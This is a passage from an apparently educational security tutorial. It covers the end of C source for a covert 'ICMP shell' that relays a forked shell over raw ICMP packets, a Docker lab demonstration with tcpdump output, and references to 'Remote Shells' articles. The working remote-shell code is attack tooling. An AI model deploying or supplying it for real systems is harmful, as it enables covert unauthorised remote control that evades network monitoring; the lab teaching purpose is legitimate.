    <span id="cb230-258"><a href="#cb230-258" aria-hidden="true" tabindex="-1"></a>        <span class="dt">int</span> len<span class="op">,</span> r<span class="op">;</span></span>
    <span id="cb230-259"><a href="#cb230-259" aria-hidden="true" tabindex="-1"></a>        <span class="dt">char</span> buffer<span class="op">[</span>BUF_SIZE<span class="op">];</span>  <span class="co">/* 1024 chars */</span></span>
    <span id="cb230-260"><a href="#cb230-260" aria-hidden="true" tabindex="-1"></a>        max<span class="op">++;</span></span>
    <span id="cb230-261"><a href="#cb230-261" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb230-262"><a href="#cb230-262" aria-hidden="true" tabindex="-1"></a>        <span class="cf">while</span> <span class="op">(</span><span class="dv">1</span><span class="op">)</span></span>
    <span id="cb230-263"><a href="#cb230-263" aria-hidden="true" tabindex="-1"></a>        <span class="op">{</span></span>
    <span id="cb230-264"><a href="#cb230-264" aria-hidden="true" tabindex="-1"></a>                <span class="co">// macros to initialize the file descriptor set</span></span>
    <span id="cb230-265"><a href="#cb230-265" aria-hidden="true" tabindex="-1"></a>                FD_ZERO<span class="op">(&amp;</span>rfds<span class="op">);</span></span>
    <span id="cb230-266"><a href="#cb230-266" aria-hidden="true" tabindex="-1"></a>                FD_SET<span class="op">(</span>s<span class="op">,&amp;</span>rfds<span class="op">);</span></span>
    <span id="cb230-267"><a href="#cb230-267" aria-hidden="true" tabindex="-1"></a>                FD_SET<span class="op">(</span>s1<span class="op">,&amp;</span>rfds<span class="op">);</span></span>
    <span id="cb230-268"><a href="#cb230-268" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb230-269"><a href="#cb230-269" aria-hidden="true" tabindex="-1"></a>                <span class="co">/* Time out. */</span></span>
    <span id="cb230-270"><a href="#cb230-270" aria-hidden="true" tabindex="-1"></a>                <span class="co">// set to 1 second</span></span>
    <span id="cb230-271"><a href="#cb230-271" aria-hidden="true" tabindex="-1"></a>                <span class="co">// microseconds resolution</span></span>
    <span id="cb230-272"><a href="#cb230-272" aria-hidden="true" tabindex="-1"></a>                tv<span class="op">.</span>tv_sec <span class="op">=</span> <span class="dv">1</span><span class="op">;</span></span>
    <span id="cb230-273"><a href="#cb230-273" aria-hidden="true" tabindex="-1"></a>                tv<span class="op">.</span>tv_usec <span class="op">=</span> <span class="dv">0</span><span class="op">;</span></span>
    <span id="cb230-274"><a href="#cb230-274" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb230-275"><a href="#cb230-275" aria-hidden="true" tabindex="-1"></a>                <span class="co">// standard select loop for a network application.</span></span>
    <span id="cb230-276"><a href="#cb230-276" aria-hidden="true" tabindex="-1"></a>                <span class="cf">if</span> <span class="op">((</span>r <span class="op">=</span> select <span class="op">(</span>max<span class="op">,</span> <span class="op">&amp;</span>rfds<span class="op">,</span> NULL<span class="op">,</span> NULL<span class="op">,</span> <span class="op">&amp;</span>tv<span class="op">))</span> <span class="op">&lt;</span> <span class="dv">0</span><span class="op">)</span></span>
    <span id="cb230-277"><a href="#cb230-277" aria-hidden="true" tabindex="-1"></a>                <span class="op">{</span></span>
    <span id="cb230-278"><a href="#cb230-278" aria-hidden="true" tabindex="-1"></a>                        perror <span class="op">(</span><span class="st">&quot;select:&quot;</span><span class="op">);</span></span>
    <span id="cb230-279"><a href="#cb230-279" aria-hidden="true" tabindex="-1"></a>                        exit <span class="op">(</span>EXIT_FAILURE<span class="op">);</span></span>
    <span id="cb230-280"><a href="#cb230-280" aria-hidden="true" tabindex="-1"></a>                <span class="op">}</span></span>
    <span id="cb230-281"><a href="#cb230-281" aria-hidden="true" tabindex="-1"></a>                <span class="cf">else</span> <span class="cf">if</span> <span class="op">(</span>r <span class="op">&gt;</span> <span class="dv">0</span><span class="op">)</span> <span class="co">/* If there is data to process */</span></span>
    <span id="cb230-282"><a href="#cb230-282" aria-hidden="true" tabindex="-1"></a>                <span class="op">{</span></span>
    <span id="cb230-283"><a href="#cb230-283" aria-hidden="true" tabindex="-1"></a>                <span class="co">// The memfrob function does a XOR crypting with</span></span>
    <span id="cb230-284"><a href="#cb230-284" aria-hidden="true" tabindex="-1"></a>                <span class="co">// key (42). The greatest thing about XOR crypting is that the</span></span>
    <span id="cb230-285"><a href="#cb230-285" aria-hidden="true" tabindex="-1"></a>                <span class="co">// same function can be used for crypt and decrypt. Other than</span></span>
    <span id="cb230-286"><a href="#cb230-286" aria-hidden="true" tabindex="-1"></a>                <span class="co">// that, with a 1 byte long key (42 in this case) it is pretty</span></span>
    <span id="cb230-287"><a href="#cb230-287" aria-hidden="true" tabindex="-1"></a>                <span class="co">// useless.</span></span>
    <span id="cb230-288"><a href="#cb230-288" aria-hidden="true" tabindex="-1"></a>                        <span class="cf">if</span> <span class="op">(</span>FD_ISSET<span class="op">(</span>s<span class="op">,</span> <span class="op">&amp;</span>rfds<span class="op">))</span></span>
    <span id="cb230-289"><a href="#cb230-289" aria-hidden="true" tabindex="-1"></a>                        <span class="op">{</span></span>
    <span id="cb230-290"><a href="#cb230-290" aria-hidden="true" tabindex="-1"></a>                                <span class="co">// get data from network using function pointer,</span></span>
    <span id="cb230-291"><a href="#cb230-291" aria-hidden="true" tabindex="-1"></a>                                <span class="co">// and resend it to our shell.</span></span>
    <span id="cb230-292"><a href="#cb230-292" aria-hidden="true" tabindex="-1"></a>                                memset <span class="op">(</span>buffer<span class="op">,</span> <span class="dv">0</span><span class="op">,</span> BUF_SIZE<span class="op">);</span></span>
    <span id="cb230-293"><a href="#cb230-293" aria-hidden="true" tabindex="-1"></a>                                <span class="cf">if</span> <span class="op">((</span>len <span class="op">=</span> net_read <span class="op">(</span>s<span class="op">,</span> buffer<span class="op">,</span> BUF_SIZE<span class="op">))</span> <span class="op">==</span> <span class="dv">0</span><span class="op">)</span> <span class="cf">continue</span><span class="op">;</span></span>
    <span id="cb230-294"><a href="#cb230-294" aria-hidden="true" tabindex="-1"></a>                                write <span class="op">(</span>s1<span class="op">,</span> buffer<span class="op">,</span> len<span class="op">);</span></span>
    <span id="cb230-295"><a href="#cb230-295" aria-hidden="true" tabindex="-1"></a>                        <span class="op">}</span></span>
    <span id="cb230-296"><a href="#cb230-296" aria-hidden="true" tabindex="-1"></a>                        <span class="cf">if</span> <span class="op">(</span>FD_ISSET<span class="op">(</span>s1<span class="op">,</span> <span class="op">&amp;</span>rfds<span class="op">))</span></span>
    <span id="cb230-297"><a href="#cb230-297" aria-hidden="true" tabindex="-1"></a>                        <span class="op">{</span></span>
    <span id="cb230-298"><a href="#cb230-298" aria-hidden="true" tabindex="-1"></a>                                <span class="co">// get data from our shell, then</span></span>
    <span id="cb230-299"><a href="#cb230-299" aria-hidden="true" tabindex="-1"></a>                                <span class="co">// we send it back through the network using the</span></span>
    <span id="cb230-300"><a href="#cb230-300" aria-hidden="true" tabindex="-1"></a>                                <span class="co">// function pointer.</span></span>
    <span id="cb230-301"><a href="#cb230-301" aria-hidden="true" tabindex="-1"></a>                                memset <span class="op">(</span>buffer<span class="op">,</span> <span class="dv">0</span><span class="op">,</span> BUF_SIZE<span class="op">);</span></span>
    <span id="cb230-302"><a href="#cb230-302" aria-hidden="true" tabindex="-1"></a>                                <span class="cf">if</span> <span class="op">((</span>len <span class="op">=</span> read <span class="op">(</span>s1<span class="op">,</span> buffer<span class="op">,</span> BUF_SIZE<span class="op">))</span> <span class="op">&lt;=</span> <span class="dv">0</span><span class="op">)</span> exit <span class="op">(</span>EXIT_FAILURE<span class="op">);</span></span>
    <span id="cb230-303"><a href="#cb230-303" aria-hidden="true" tabindex="-1"></a>                                net_write <span class="op">(</span>s<span class="op">,</span> buffer<span class="op">,</span> len<span class="op">);</span></span>
    <span id="cb230-304"><a href="#cb230-304" aria-hidden="true" tabindex="-1"></a>                        <span class="op">}</span></span>
    <span id="cb230-305"><a href="#cb230-305" aria-hidden="true" tabindex="-1"></a>                <span class="op">}</span></span>
    <span id="cb230-306"><a href="#cb230-306" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
    <span id="cb230-307"><a href="#cb230-307" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
    <span id="cb230-308"><a href="#cb230-308" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb230-309"><a href="#cb230-309" aria-hidden="true" tabindex="-1"></a><span class="co">// Set up the socket pair and create a new process (using fork)</span></span>
    <span id="cb230-310"><a href="#cb230-310" aria-hidden="true" tabindex="-1"></a><span class="co">//</span></span>
    <span id="cb230-311"><a href="#cb230-311" aria-hidden="true" tabindex="-1"></a><span class="co">// Function creates a socket pair using the syscall socketpair).</span></span>
    <span id="cb230-312"><a href="#cb230-312" aria-hidden="true" tabindex="-1"></a><span class="co">// The fork system call creates a new process as an identical image</span></span>
    <span id="cb230-313"><a href="#cb230-313" aria-hidden="true" tabindex="-1"></a><span class="co">// that make use of the sp socketpair to communicate both processes.</span></span>
    <span id="cb230-314"><a href="#cb230-314" aria-hidden="true" tabindex="-1"></a><span class="co">//</span></span>
    <span id="cb230-315"><a href="#cb230-315" aria-hidden="true" tabindex="-1"></a><span class="co">// Instead of feeding data into our shell directly from the network,</span></span>
    <span id="cb230-316"><a href="#cb230-316" aria-hidden="true" tabindex="-1"></a><span class="co">// function is used to send/receive data using the counterpart socket</span></span>
    <span id="cb230-317"><a href="#cb230-317" aria-hidden="true" tabindex="-1"></a><span class="co">// provided by socketpair.</span></span>
    <span id="cb230-318"><a href="#cb230-318" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span></span>
    <span id="cb230-319"><a href="#cb230-319" aria-hidden="true" tabindex="-1"></a>secure_shell <span class="op">(</span><span class="dt">int</span> s<span class="op">)</span></span>
    <span id="cb230-320"><a href="#cb230-320" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
    <span id="cb230-321"><a href="#cb230-321" aria-hidden="true" tabindex="-1"></a>        pid_t pid<span class="op">;</span></span>
    <span id="cb230-322"><a href="#cb230-322" aria-hidden="true" tabindex="-1"></a>        <span class="dt">int</span> sp<span class="op">[</span><span class="dv">2</span><span class="op">];</span></span>
    <span id="cb230-323"><a href="#cb230-323" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb230-324"><a href="#cb230-324" aria-hidden="true" tabindex="-1"></a>        <span class="co">/* Create a socketpair to talk to the child process */</span></span>
    <span id="cb230-325"><a href="#cb230-325" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="op">((</span>socketpair <span class="op">(</span>AF_UNIX<span class="op">,</span> SOCK_STREAM<span class="op">,</span> <span class="dv">0</span><span class="op">,</span> sp<span class="op">))</span> <span class="op">&lt;</span> <span class="dv">0</span><span class="op">)</span></span>
    <span id="cb230-326"><a href="#cb230-326" aria-hidden="true" tabindex="-1"></a>        <span class="op">{</span></span>
    <span id="cb230-327"><a href="#cb230-327" aria-hidden="true" tabindex="-1"></a>                perror <span class="op">(</span><span class="st">&quot;socketpair:&quot;</span><span class="op">);</span></span>
    <span id="cb230-328"><a href="#cb230-328" aria-hidden="true" tabindex="-1"></a>                exit <span class="op">(</span><span class="dv">1</span><span class="op">);</span></span>
    <span id="cb230-329"><a href="#cb230-329" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
    <span id="cb230-330"><a href="#cb230-330" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb230-331"><a href="#cb230-331" aria-hidden="true" tabindex="-1"></a>        <span class="co">/* Fork a shell */</span></span>
    <span id="cb230-332"><a href="#cb230-332" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="op">((</span>pid <span class="op">=</span> fork <span class="op">())</span> <span class="op">&lt;</span> <span class="dv">0</span><span class="op">)</span></span>
    <span id="cb230-333"><a href="#cb230-333" aria-hidden="true" tabindex="-1"></a>        <span class="op">{</span></span>
    <span id="cb230-334"><a href="#cb230-334" aria-hidden="true" tabindex="-1"></a>                perror <span class="op">(</span><span class="st">&quot;fork:&quot;</span><span class="op">);</span></span>
    <span id="cb230-335"><a href="#cb230-335" aria-hidden="true" tabindex="-1"></a>                exit <span class="op">(</span><span class="dv">1</span><span class="op">);</span></span>
    <span id="cb230-336"><a href="#cb230-336" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
    <span id="cb230-337"><a href="#cb230-337" aria-hidden="true" tabindex="-1"></a>        <span class="cf">else</span></span>
    <span id="cb230-338"><a href="#cb230-338" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="op">(!</span>pid<span class="op">)</span> <span class="co">/* Child Process */</span></span>
    <span id="cb230-339"><a href="#cb230-339" aria-hidden="true" tabindex="-1"></a>        <span class="op">{</span></span>
    <span id="cb230-340"><a href="#cb230-340" aria-hidden="true" tabindex="-1"></a>                close <span class="op">(</span>sp<span class="op">[</span><span class="dv">1</span><span class="op">]);</span></span>
    <span id="cb230-341"><a href="#cb230-341" aria-hidden="true" tabindex="-1"></a>                close <span class="op">(</span>s<span class="op">);</span></span>
    <span id="cb230-342"><a href="#cb230-342" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb230-343"><a href="#cb230-343" aria-hidden="true" tabindex="-1"></a>                start_shell <span class="op">(</span>sp<span class="op">[</span><span class="dv">0</span><span class="op">]);</span></span>
    <span id="cb230-344"><a href="#cb230-344" aria-hidden="true" tabindex="-1"></a>                <span class="co">/* This function will never return */</span></span>
    <span id="cb230-345"><a href="#cb230-345" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
    <span id="cb230-346"><a href="#cb230-346" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb230-347"><a href="#cb230-347" aria-hidden="true" tabindex="-1"></a>        <span class="co">/* At this point we are the father process */</span></span>
    <span id="cb230-348"><a href="#cb230-348" aria-hidden="true" tabindex="-1"></a>        close <span class="op">(</span>sp<span class="op">[</span><span class="dv">0</span><span class="op">]);</span></span>
    <span id="cb230-349"><a href="#cb230-349" aria-hidden="true" tabindex="-1"></a><span class="pp">#ifdef VERBOSE</span></span>
    <span id="cb230-350"><a href="#cb230-350" aria-hidden="true" tabindex="-1"></a>        printf <span class="op">(</span><span class="st">&quot;+ Starting async read loop</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
    <span id="cb230-351"><a href="#cb230-351" aria-hidden="true" tabindex="-1"></a><span class="pp">#endif</span></span>
    <span id="cb230-352"><a href="#cb230-352" aria-hidden="true" tabindex="-1"></a>        net_write <span class="op">(</span>s<span class="op">,</span> <span class="st">&quot;iRS v0.1</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">,</span> <span class="dv">9</span><span class="op">);</span></span>
    <span id="cb230-353"><a href="#cb230-353" aria-hidden="true" tabindex="-1"></a>        async_read <span class="op">(</span>s<span class="op">,</span> sp<span class="op">[</span><span class="dv">1</span><span class="op">]);</span></span>
    <span id="cb230-354"><a href="#cb230-354" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb230-355"><a href="#cb230-355" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
    <span id="cb230-356"><a href="#cb230-356" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb230-357"><a href="#cb230-357" aria-hidden="true" tabindex="-1"></a><span class="dt">int</span></span>
    <span id="cb230-358"><a href="#cb230-358" aria-hidden="true" tabindex="-1"></a>main <span class="op">(</span><span class="dt">int</span> argc<span class="op">,</span> <span class="dt">char</span> <span class="op">*</span>argv<span class="op">[])</span></span>
    <span id="cb230-359"><a href="#cb230-359" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
    <span id="cb230-360"><a href="#cb230-360" aria-hidden="true" tabindex="-1"></a>        <span class="dt">int</span> i <span class="op">=</span><span class="dv">1</span><span class="op">;</span></span>
    <span id="cb230-361"><a href="#cb230-361" aria-hidden="true" tabindex="-1"></a>        <span class="co">/* </span><span class="al">FIXME</span><span class="co">: Check command-line arguments */</span></span>
    <span id="cb230-362"><a href="#cb230-362" aria-hidden="true" tabindex="-1"></a>        <span class="co">/* Go daemon ()*/</span></span>
    <span id="cb230-363"><a href="#cb230-363" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb230-364"><a href="#cb230-364" aria-hidden="true" tabindex="-1"></a>        <span class="co">// Assign function pointers</span></span>
    <span id="cb230-365"><a href="#cb230-365" aria-hidden="true" tabindex="-1"></a>        net_read <span class="op">=</span> net_read_icmp<span class="op">;</span></span>
    <span id="cb230-366"><a href="#cb230-366" aria-hidden="true" tabindex="-1"></a>        net_write <span class="op">=</span> net_write_icmp<span class="op">;</span></span>
    <span id="cb230-367"><a href="#cb230-367" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb230-368"><a href="#cb230-368" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="op">(</span>argv<span class="op">[</span>i<span class="op">][</span><span class="dv">0</span><span class="op">]</span> <span class="op">==</span> <span class="ch">&#39;d&#39;</span><span class="op">)</span></span>
    <span id="cb230-369"><a href="#cb230-369" aria-hidden="true" tabindex="-1"></a>        <span class="op">{</span></span>
    <span id="cb230-370"><a href="#cb230-370" aria-hidden="true" tabindex="-1"></a>                i<span class="op">++;</span></span>
    <span id="cb230-371"><a href="#cb230-371" aria-hidden="true" tabindex="-1"></a>                daemon <span class="op">(</span><span class="dv">0</span><span class="op">,</span><span class="dv">0</span><span class="op">);</span></span>
    <span id="cb230-372"><a href="#cb230-372" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
    <span id="cb230-373"><a href="#cb230-373" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb230-374"><a href="#cb230-374" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="op">(</span>argv<span class="op">[</span>i<span class="op">][</span><span class="dv">0</span><span class="op">]</span> <span class="op">==</span> <span class="ch">&#39;s&#39;</span><span class="op">)</span></span>
    <span id="cb230-375"><a href="#cb230-375" aria-hidden="true" tabindex="-1"></a>                secure_shell <span class="op">(</span>raw_init <span class="op">(</span>argv<span class="op">[</span>i<span class="op">+</span><span class="dv">1</span><span class="op">],</span> IPPROTO_ICMP<span class="op">));</span></span>
    <span id="cb230-376"><a href="#cb230-376" aria-hidden="true" tabindex="-1"></a>        <span class="cf">else</span> <span class="cf">if</span> <span class="op">(</span>argv<span class="op">[</span>i<span class="op">][</span><span class="dv">0</span><span class="op">]</span> <span class="op">==</span> <span class="ch">&#39;c&#39;</span><span class="op">)</span></span>
    <span id="cb230-377"><a href="#cb230-377" aria-hidden="true" tabindex="-1"></a>                async_read <span class="op">(</span>raw_init <span class="op">(</span>argv<span class="op">[</span>i<span class="op">+</span><span class="dv">1</span><span class="op">],</span> IPPROTO_ICMP<span class="op">),</span> <span class="dv">0</span><span class="op">);</span></span>
    <span id="cb230-378"><a href="#cb230-378" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb230-379"><a href="#cb230-379" aria-hidden="true" tabindex="-1"></a>        <span class="cf">return</span> <span class="dv">0</span><span class="op">;</span></span>
    <span id="cb230-380"><a href="#cb230-380" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
    <p>Let’s try it out:</p>
    <div class="sourceCode" id="cb231"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb231-1"><a href="#cb231-1" aria-hidden="true" tabindex="-1"></a><span class="co"># In the first terminal</span></span>
    <span id="cb231-2"><a href="#cb231-2" aria-hidden="true" tabindex="-1"></a><span class="ex">docker</span> network create testnet</span>
    <span id="cb231-3"><a href="#cb231-3" aria-hidden="true" tabindex="-1"></a><span class="ex">docker</span> run <span class="at">--privileged</span> <span class="at">--net</span> testnet <span class="at">-it</span> basic_cybersecurity6:latest</span>
    <span id="cb231-4"><a href="#cb231-4" aria-hidden="true" tabindex="-1"></a><span class="ex">root@d1c09e1b8f84:~#</span> ./icmp_shell c 172.18.0.3</span>
    <span id="cb231-5"><a href="#cb231-5" aria-hidden="true" tabindex="-1"></a><span class="ex">+</span> Raw to <span class="st">&#39;172.18.0.3&#39;</span> <span class="er">(</span><span class="bu">type</span> : 0<span class="kw">)</span></span>
    <span id="cb231-6"><a href="#cb231-6" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb231-7"><a href="#cb231-7" aria-hidden="true" tabindex="-1"></a><span class="co"># In the second terminal</span></span>
    <span id="cb231-8"><a href="#cb231-8" aria-hidden="true" tabindex="-1"></a><span class="ex">docker</span> run <span class="at">--privileged</span> <span class="at">--net</span> testnet <span class="at">-it</span> basic_cybersecurity6:latest</span>
    <span id="cb231-9"><a href="#cb231-9" aria-hidden="true" tabindex="-1"></a><span class="ex">root@c134e2dbde63:~#</span> ./icmp_shell s 172.18.0.2</span>
    <span id="cb231-10"><a href="#cb231-10" aria-hidden="true" tabindex="-1"></a><span class="ex">+</span> Raw to <span class="st">&#39;172.18.0.2&#39;</span> <span class="er">(</span><span class="bu">type</span> : 0<span class="kw">)</span></span>
    <span id="cb231-11"><a href="#cb231-11" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb231-12"><a href="#cb231-12" aria-hidden="true" tabindex="-1"></a><span class="co"># In the third terminal</span></span>
    <span id="cb231-13"><a href="#cb231-13" aria-hidden="true" tabindex="-1"></a><span class="ex">docker</span> exec <span class="at">-it</span> d1c09e1b8f84 bash</span>
    <span id="cb231-14"><a href="#cb231-14" aria-hidden="true" tabindex="-1"></a><span class="ex">root@d1c09e1b8f84:~#</span> tcpdump <span class="at">-nnXSs</span> 0 <span class="at">-i</span> eth0 icmp</span>
    <span id="cb231-15"><a href="#cb231-15" aria-hidden="true" tabindex="-1"></a><span class="ex">tcpdump:</span> verbose output suppressed, use <span class="at">-v</span> or <span class="at">-vv</span> for full protocol decode</span>
    <span id="cb231-16"><a href="#cb231-16" aria-hidden="true" tabindex="-1"></a><span class="ex">listening</span> on eth0, link-type EN10MB <span class="er">(</span><span class="ex">Ethernet</span><span class="kw">)</span><span class="ex">,</span> capture size 262144 bytes</span>
    <span id="cb231-17"><a href="#cb231-17" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb231-18"><a href="#cb231-18" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb231-19"><a href="#cb231-19" aria-hidden="true" tabindex="-1"></a><span class="co"># In the first terminal</span></span>
    <span id="cb231-20"><a href="#cb231-20" aria-hidden="true" tabindex="-1"></a><span class="co"># uname -a</span></span>
    <span id="cb231-21"><a href="#cb231-21" aria-hidden="true" tabindex="-1"></a><span class="ex">iRS</span> v0.1</span>
    <span id="cb231-22"><a href="#cb231-22" aria-hidden="true" tabindex="-1"></a><span class="co"># ls</span></span>
    <span id="cb231-23"><a href="#cb231-23" aria-hidden="true" tabindex="-1"></a><span class="ex">checksec.sh</span></span>
    <span id="cb231-24"><a href="#cb231-24" aria-hidden="true" tabindex="-1"></a><span class="ex">client</span></span>
    <span id="cb231-25"><a href="#cb231-25" aria-hidden="true" tabindex="-1"></a><span class="ex">client.c</span></span>
    <span id="cb231-26"><a href="#cb231-26" aria-hidden="true" tabindex="-1"></a><span class="ex">crypt_shell</span></span>
    <span id="cb231-27"><a href="#cb231-27" aria-hidden="true" tabindex="-1"></a><span class="ex">crypt_shell.c</span></span>
    <span id="cb231-28"><a href="#cb231-28" aria-hidden="true" tabindex="-1"></a><span class="ex">icmp_shell</span></span>
    <span id="cb231-29"><a href="#cb231-29" aria-hidden="true" tabindex="-1"></a><span class="ex">icmp_shell.c</span></span>
    <span id="cb231-30"><a href="#cb231-30" aria-hidden="true" tabindex="-1"></a><span class="ex">rp++</span></span>
    <span id="cb231-31"><a href="#cb231-31" aria-hidden="true" tabindex="-1"></a><span class="ex">server</span></span>
    <span id="cb231-32"><a href="#cb231-32" aria-hidden="true" tabindex="-1"></a><span class="ex">server.c</span></span>
    <span id="cb231-33"><a href="#cb231-33" aria-hidden="true" tabindex="-1"></a><span class="co">#</span></span>
    <span id="cb231-34"><a href="#cb231-34" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb231-35"><a href="#cb231-35" aria-hidden="true" tabindex="-1"></a><span class="co"># which produces the following output in the third terminal</span></span>
    <span id="cb231-36"><a href="#cb231-36" aria-hidden="true" tabindex="-1"></a><span class="ex">08:49:28.471170</span> IP 172.18.0.2 <span class="op">&gt;</span> 172.18.0.3: ICMP echo reply, id 12345, seq 5, length 15</span>
    <span id="cb231-37"><a href="#cb231-37" aria-hidden="true" tabindex="-1"></a>    <span class="ex">0x0000:</span>  4500 0023 e750 4000 4001 fb5f ac12 0002  E..#.P@.@.._....</span>
    <span id="cb231-38"><a href="#cb231-38" aria-hidden="true" tabindex="-1"></a>    <span class="ex">0x0010:</span>  ac12 0003 0000 594b 3039 0005 0003 0000  ......YK09......</span>
    <span id="cb231-39"><a href="#cb231-39" aria-hidden="true" tabindex="-1"></a>    <span class="ex">0x0020:</span>  6c73 0a                                  ls.</span>
    <span id="cb231-40"><a href="#cb231-40" aria-hidden="true" tabindex="-1"></a><span class="ex">08:49:28.476440</span> IP 172.18.0.3 <span class="op">&gt;</span> 172.18.0.2: ICMP echo reply, id 12345, seq 5, length 111</span>
    <span id="cb231-41"><a href="#cb231-41" aria-hidden="true" tabindex="-1"></a>    <span class="ex">0x0000:</span>  4500 0083 5462 4000 4001 8dee ac12 0003  E...Tb@.@.......</span>
    <span id="cb231-42"><a href="#cb231-42" aria-hidden="true" tabindex="-1"></a>    <span class="ex">0x0010:</span>  ac12 0002 0000 1614 3039 0005 0063 0000  ........09...c..</span>
    <span id="cb231-43"><a href="#cb231-43" aria-hidden="true" tabindex="-1"></a>    <span class="ex">0x0020:</span>  6368 6563 6b73 6563 2e73 680a 636c 6965  checksec.sh.clie</span>
    <span id="cb231-44"><a href="#cb231-44" aria-hidden="true" tabindex="-1"></a>    <span class="ex">0x0030:</span>  6e74 0a63 6c69 656e 742e 630a 6372 7970  nt.client.c.cryp</span>
    <span id="cb231-45"><a href="#cb231-45" aria-hidden="true" tabindex="-1"></a>    <span class="ex">0x0040:</span>  745f 7368 656c 6c0a 6372 7970 745f 7368  t_shell.crypt_sh</span>
    <span id="cb231-46"><a href="#cb231-46" aria-hidden="true" tabindex="-1"></a>    <span class="ex">0x0050:</span>  656c 6c2e 630a 6963 6d70 5f73 6865 6c6c  ell.c.icmp_shell</span>
    <span id="cb231-47"><a href="#cb231-47" aria-hidden="true" tabindex="-1"></a>    <span class="ex">0x0060:</span>  0a69 636d 705f 7368 656c 6c2e 630a 7270  .icmp_shell.c.rp</span>
    <span id="cb231-48"><a href="#cb231-48" aria-hidden="true" tabindex="-1"></a>    <span class="ex">0x0070:</span>  2b2b 0a73 6572 7665 720a 7365 7276 6572  ++.server.server</span>
    <span id="cb231-49"><a href="#cb231-49" aria-hidden="true" tabindex="-1"></a>    <span class="ex">0x0080:</span>  2e63 0a                                  .c.</span>
    <span id="cb231-50"><a href="#cb231-50" aria-hidden="true" tabindex="-1"></a><span class="ex">08:49:28.477890</span> IP 172.18.0.3 <span class="op">&gt;</span> 172.18.0.2: ICMP echo reply, id 12345, seq 5, length 14</span>
    <span id="cb231-51"><a href="#cb231-51" aria-hidden="true" tabindex="-1"></a>    <span class="ex">0x0000:</span>  4500 0022 5463 4000 4001 8e4e ac12 0003  E..<span class="st">&quot;Tc@.@..N....</span></span>
    <span id="cb231-52"><a href="#cb231-52" aria-hidden="true" tabindex="-1"></a><span class="st">    0x0010:  ac12 0002 0000 ac9f 3039 0005 0002 0000  ........09......</span></span>
    <span id="cb231-53"><a href="#cb231-53" aria-hidden="true" tabindex="-1"></a><span class="st">    0x0020:  2320                                     #.</span></span></code></pre></div>
    <h3 id="resources-13">Resources</h3>
    <ul>
    <li>[1] 0x00pf (2016), <em>Remote Shells. Part I</em>. Retrieved from https://0x00sec.org/t/remote-shells-part-i/269.</li>
    <li>[2] picoFlamingo, <em>0x00sec_code</em>, Github. Retrieved from https://github.com/0x00pf/0x00sec_code/tree/master/remote_shell.</li>
    <li>[3] 0x00pf (2016), <em>Remote Shells Part IV. The Invisible Remote Shell</em>. Retrieved from https://0x00sec.org/t/remote-shells-part-iv-the-invisible-remote-shell/743</li>
    <li>[4] 0x00pf (2016), <em>Remote Shells. Part II. Crypt your link</em>. Retrieved from https://0x00sec.org/t/remote-shells-part-ii-crypt-your-link/306.</li>
    </ul>
    <h2 id="pwntools---ctf-toolkit">pwntools - CTF toolkit</h2>
    <p>From [1]: &gt; Pwntools is a CTF framework and exploit development library. Written in Python, it is designed for rapid prototyping and development, and intended to make exploit writing as simple as possible.</p>
    <p>The following tutorials builds from [4]:</p>
    <h3 id="assembly-and-elf-manipulation">Assembly and ELF manipulation</h3>
    <p>For a simple code like:</p>
    <div class="sourceCode" id="cb232"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb232-1"><a href="#cb232-1" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;stdio.h&gt;</span></span>
    <span id="cb232-2"><a href="#cb232-2" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb232-3"><a href="#cb232-3" aria-hidden="true" tabindex="-1"></a><span class="dt">int</span> main<span class="op">(</span><span class="dt">int</span> argc<span class="op">,</span> <span class="dt">char</span><span class="op">*</span> argv<span class="op">[])</span></span>
    <span id="cb232-4"><a href="#cb232-4" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
